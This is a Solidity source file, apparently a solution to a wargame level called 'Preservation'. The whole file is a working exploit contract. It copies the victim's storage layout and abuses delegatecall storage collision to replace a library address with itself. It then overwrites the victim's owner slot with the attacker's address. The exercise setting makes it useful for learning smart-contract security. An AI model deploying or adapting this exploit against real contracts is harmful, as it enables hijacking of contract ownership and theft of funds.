// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract AttackPreservation {
    // maintain the preservation's variable declaration order and type
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    Preservation immutable victim;

    constructor(Preservation _victim) {
        victim = _victim;
    }

    function attack() external {
        victim.setFirstTime(uint160(address(this)));

        require(
            victim.timeZone1Library() == address(this),
            "timeZone1Library address is not our malicious contract address!"
        );

        victim.setFirstTime(uint160(msg.sender));
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
